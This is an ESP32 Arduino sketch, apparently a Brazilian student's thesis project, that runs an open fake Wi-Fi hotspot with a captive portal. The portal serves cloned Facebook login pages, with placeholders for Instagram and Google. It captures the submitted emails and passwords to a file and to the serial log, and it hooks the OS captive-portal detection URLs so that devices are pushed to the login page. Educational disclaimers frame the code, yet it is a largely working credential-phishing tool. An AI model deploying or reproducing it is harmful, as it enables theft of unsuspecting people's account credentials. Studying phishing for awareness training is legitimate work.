/*
TCC SEGURAN√áA DA INFORMA√á√ÉO - CAPTIVE PORTAL EDUCATIVO
Autor: Rafael
Data: 01/10/2025
Descri√ß√£o: Sistema de captive portal para demonstra√ß√£o educativa sobre phishing
*/

// BIBLIOTECAS NECESS√ÅRIAS
#include <WiFi.h>          // Biblioteca para funcionalidades WiFi do ESP32
#include <WebServer.h>     // Biblioteca para criar servidor web
#include <DNSServer.h>     // Biblioteca para servidor DNS (redirecionamento)
#include "SPIFFS.h"        // Biblioteca para sistema de arquivos interno

// CONFIGURA√á√ïES DE REDE E SERVIDOR
const byte DNS_PORT = 53;           // Porta padr√£o do DNS
DNSServer dnsServer;                // Objeto do servidor DNS
WebServer webServer(80);            // Objeto do servidor web na porta 80 (HTTP)

// VARI√ÅVEIS GLOBAIS
String wifiName = "WiFi 5G Livre";  // Nome da rede WiFi fake
IPAddress apIP(192, 168, 4, 1);     // IP fixo do access point
bool usuarioLogado = false;         // Controle de sess√£o do usu√°rio

/*
 * FUN√á√ÉO: readLoginsFile()
 * DESCRI√á√ÉO: L√™ e retorna o conte√∫do do arquivo de logins
 * RETORNO: String com todo o conte√∫do do arquivo
 */
String readLoginsFile() {
  String content = "";
  File file = SPIFFS.open("/cw2e.txt", FILE_READ);  // Abre arquivo para leitura
  if(file){
    while(file.available()){
      content += (char)file.read();  // L√™ caractere por caractere
    }
    file.close();  // Fecha o arquivo
  } else {
    content = "Arquivo vazio ou n√£o encontrado";  // Mensagem de erro
  }
  return content;
}

/*
 * FUN√á√ÉO: setup()
 * DESCRI√á√ÉO: Fun√ß√£o de inicializa√ß√£o do Arduino/ESP32
 * EXECUTADA: Uma vez ao ligar o dispositivo
 */
void setup() {
  Serial.begin(115200);  // Inicia comunica√ß√£o serial para debug
  
  // INICIALIZA√á√ÉO DO SPIFFS (Sistema de Arquivos)
  if(!SPIFFS.begin(true)){
    Serial.println("Erro SPIFFS");
    return;  // Para execu√ß√£o se n√£o conseguir inicializar
  }
  
  // CONFIGURA√á√ÉO DO ACCESS POINT
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));  // Configura IP fixo
  WiFi.softAP(wifiName.c_str(), NULL);  // Inicia AP sem senha
  
  Serial.println("AP WiFi Gratis iniciado");
  Serial.print("IP: ");
  Serial.println(WiFi.softAPIP());

  // CONFIGURA√á√ÉO DO SERVIDOR DNS
  // "*" significa que captura TODOS os dom√≠nios
  dnsServer.start(DNS_PORT, "*", apIP);

  // ===========================================================================
  // CONFIGURA√á√ÉO DAS ROTAS DO SERVIDOR WEB
  // ===========================================================================

  /*
   * ROTA: "/" - P√°gina Inicial
   * DESCRI√á√ÉO: P√°gina principal com op√ß√µes de login
   * COMPORTAMENTO: 
   *   - Se usu√°rio logado: redireciona para Google
   *   - Se n√£o logado: mostra p√°gina com 3 op√ß√µes
   */
  webServer.on("/", []() {
    if(usuarioLogado) {
      // Usu√°rio j√° autenticado - libera acesso √† internet
      webServer.send(200, "text/html", 
        "<html><head>"
        "<meta http-equiv='refresh' content='0;url=https://www.google.com'>"
        "</head></html>");
    } else {
      // P√°gina inicial n√£o autenticado
      String mainPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Gratuito - Login Obrigat√≥rio</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            min-height: 100vh;
        }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin: 40px 0 30px 0; }
        .header h1 { font-size: 32px; margin-bottom: 10px; }
        .header p { font-size: 18px; opacity: 0.9; }
        .card { 
            background: rgba(255,255,255,0.95); 
            color: #333; 
            padding: 30px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
            margin: 20px 0;
        }
        .warning { 
            background: #ffeb3b; 
            color: #333; 
            padding: 15px; 
            border-radius: 10px; 
            margin: 20px 0; 
            text-align: center; 
            border-left: 4px solid #ffc107;
            font-weight: bold;
        }
        .login-options { display: flex; flex-direction: column; gap: 15px; }
        .login-btn { 
            display: flex; 
            align-items: center; 
            padding: 15px 20px; 
            border: none; 
            border-radius: 10px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            transition: all 0.3s; 
            text-decoration: none; 
            color: white;
            text-align: center;
            justify-content: center;
        }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .facebook { background: #1877f2; }
        .instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .google { background: #4285f4; }
        .btn-icon { font-size: 24px; margin-right: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üåê WiFi Gratuito</h1>
            <p>Conectado √† rede: <strong>%CURRENT_SSID%</strong></p>
        </div>
        
        <div class="card">
            <div class="warning">
                ‚ö†Ô∏è LOGIN OBRIGAT√ìRIO ‚ö†Ô∏è<br>
                Para usar a internet, fa√ßa login com uma das op√ß√µes
            </div>
            
            <div class="login-options">
                <a href="/facebook" class="login-btn facebook">
                    <span class="btn-icon">üìò</span>
                    Continuar com Facebook
                </a>
                
                <a href="/instagram" class="login-btn instagram">
                    <span class="btn-icon">üì∑</span>
                    Continuar com Instagram
                </a>
                
                <a href="/google" class="login-btn google">
                    <span class="btn-icon">üîç</span>
                    Continuar com Google
                </a>
            </div>
        </div>
    </div>
</body>
</html>
      )rawliteral";
      mainPage.replace("%CURRENT_SSID%", wifiName);  // Substitui vari√°vel no HTML
      webServer.send(200, "text/html", mainPage);    // Envia p√°gina ao cliente
    }
  });

  /*
   * ROTA: "/facebook" - P√°gina Fake do Facebook
   * DESCRI√á√ÉO: Clone da p√°gina de login do Facebook
   * OBJETIVO: Simular phishing para educa√ß√£o em seguran√ßa
   */
  webServer.on("/facebook", []() {
    String facebookPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Entre ou cadastre-se</title>
    <style>
        /* ESTILOS ID√äNTICOS AO FACEBOOK REAL */
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn" onclick="window.location.href='/'">‚Üê Voltar para Op√ß√µes</button>
        <div class="logo">
            <span>facebook</span>
        </div>
        <div class="card">
            <form action="/login" method="POST">
                <input type="hidden" name="platform" value="facebook">
                <input type="text" name="email" placeholder="Email ou telefone" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit" class="login-btn">Entrar</button>
            </form>
            <!-- ELEMENTOS ADICIONAIS PARA AUTENTICIDADE -->
        </div>
    </div>
</body>
</html>
    )rawliteral";
    webServer.send(200, "text/html", facebookPage);
  });

  /*
   * ROTA: "/instagram" - P√°gina Fake do Instagram
   * DESCRI√á√ÉO: Clone da p√°gina de login do Instagram
   * OBJETIVO: Demonstrar variedade de ataques de phishing
   */
  webServer.on("/instagram", []() {
    String instagramPage = R"rawliteral(
<!-- ESTRUTURA SIMILAR √Ä P√ÅGINA DO INSTAGRAM -->
    )rawliteral";
    webServer.send(200, "text/html", instagramPage);
  });

  /*
   * ROTA: "/google" - P√°gina Fake do Google
   * DESCRI√á√ÉO: Clone da p√°gina de login do Google
   * OBJETIVO: Mostrar que at√© servi√ßos confi√°veis podem ser clonados
   */
  webServer.on("/google", []() {
    String googlePage = R"rawliteral(
<!-- ESTRUTURA SIMILAR √Ä P√ÅGINA DO GOOGLE -->
    )rawliteral";
    webServer.send(200, "text/html", googlePage);
  });

  /*
   * ROTA: "/login" - Processamento de Login
   * M√âTODO: POST
   * DESCRI√á√ÉO: Recebe e armazena credenciais dos formul√°rios
   * SEGURAN√áA: Apenas para fins educacionais - dados n√£o s√£o usados maliciosamente
   */
  webServer.on("/login", HTTP_POST, []() {
    String email = webServer.arg("email");        // Obt√©m email do formul√°rio
    String password = webServer.arg("password");  // Obt√©m senha do formul√°rio
    String platform = webServer.arg("platform");  // Obt√©m plataforma (facebook/instagram/google)
    
    // ARMAZENAMENTO EM ARQUIVO - FINS EDUCACIONAIS
    File file = SPIFFS.open("/cw2e.txt", FILE_APPEND);
    if(file){
      file.print("=== LOGIN CAPTURADO ===\n");
      file.print("Plataforma: ");
      file.println(platform);
      file.print("Email: ");
      file.println(email);
      file.print("Senha: ");
      file.println(password);
      file.print("Horario: ");
      file.println(millis());  // Timestamp do login
      file.println("====================\n");
      file.close();
      Serial.println("‚úÖ Login salvo - Plataforma: " + platform);
    }
    
    // LOG NO SERIAL PARA DEBUG
    Serial.println("=== CREDENCIAIS CAPTURADAS ===");
    Serial.print("Plataforma: ");
    Serial.println(platform);
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Senha: ");
    Serial.println(password);
    Serial.println("====================");
    
    usuarioLogado = true;  // Marca usu√°rio como autenticado
    
    // REDIRECIONAMENTO PARA INTERNET LIBERADA
    webServer.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<meta http-equiv='refresh' content='3;url=https://www.google.com'>"
      "<style>"
      "body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }"
      ".container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }"
      ".success { color: #1877f2; font-size: 24px; margin-bottom: 20px; }"
      "</style>"
      "</head>"
      "<body>"
      "<div class='container'>"
      "<div class='success'>‚úÖ Login realizado!</div>"
      "<p>Redirecionando para Google em 3 segundos...</p>"
      "<p><small>Agora voc√™ tem acesso √† internet</small></p>"
      "</div>"
      "</body>"
      "</html>");
  });

  // ===========================================================================
  // ROTAS DE CAPTIVE PORTAL - DETEC√á√ÉO AUTOM√ÅTICA
  // ===========================================================================

  /*
   * ROTA: "/generate_204" - Android Captive Portal
   * DESCRI√á√ÉO: URL usada pelo Android para detectar internet
   * COMPORTAMENTO: Redireciona para login se n√£o autenticado
   */
  webServer.on("/generate_204", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "");  // Resposta vazia = internet OK
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });
  
  /*
   * ROTA: "/hotspot-detect.html" - Apple Captive Portal
   * DESCRI√á√ÉO: URL usada por dispositivos Apple para detectar internet
   */
  webServer.on("/hotspot-detect.html", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "Success");  // Resposta de sucesso
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });
  
  /*
   * ROTA: "/connecttest.txt" - Windows Captive Portal
   * DESCRI√á√ÉO: URL usada pelo Windows para detectar internet
   */
  webServer.on("/connecttest.txt", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "Success");
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });

  /*
   * ROTA: "onNotFound" - Captura Todas as Outras URLs
   * DESCRI√á√ÉO: Captura qualquer URL n√£o mapeada
   * OBJETIVO: For√ßar redirecionamento para p√°gina de login
   */
  webServer.onNotFound([]() {
    if(usuarioLogado) {
      // Usu√°rio autenticado - permite acesso
      webServer.send(200, "text/html", 
        "<html><body>"
        "<p>Acesso liberado. <a href='https://www.google.com'>Ir para Google</a></p>"
        "</body></html>");
    } else {
      // Usu√°rio n√£o autenticado - redireciona para login
      webServer.send(200, "text/html", 
        "<html><head>"
        "<meta http-equiv='refresh' content='0;url=/>"
        "</head></html>");
    }
  });

  // INICIALIZA√á√ÉO DO SERVIDOR WEB
  webServer.begin();
  
  // LOGS INICIAIS NO SERIAL
  Serial.println("‚úÖ Servidor CORRIGIDO iniciado!");
  Serial.println("üåê P√°gina inicial: http://192.168.4.1");
  Serial.println("üìò Facebook: http://192.168.4.1/facebook");
  Serial.println("üì∑ Instagram: http://192.168.4.1/instagram");
  Serial.println("üîç Google: http://192.168.4.1/google");
}

/*
 * FUN√á√ÉO: loop()
 * DESCRI√á√ÉO: Loop principal - executa continuamente
 * RESPONSABILIDADE: Processar requisi√ß√µes DNS e HTTP
 */
void loop() {
  dnsServer.processNextRequest();  // Processa requisi√ß√µes DNS
  webServer.handleClient();        // Processa requisi√ß√µes HTTP
}

/*
 * =============================================================================
 * CONSIDERA√á√ïES √âTICAS E LEGAIS:
 * 
 * ESTE PROJETO √â APENAS PARA FINS EDUCACIONAIS E DE PESQUISA ACAD√äMICA
 * 
 * - Nunca use em redes sem autoriza√ß√£o expl√≠cita
 * - Use apenas dados de teste/fict√≠cios
 * - Informe todos os participantes sobre a natureza do experimento
 * - Destrua todos os dados coletados ap√≥s a pesquisa
 * - Obede√ßa √†s leis locais de privacidade e seguran√ßa
 * 
 * O objetivo √© educar sobre os perigos do phishing, n√£o promover atividades maliciosas
 * =============================================================================
 */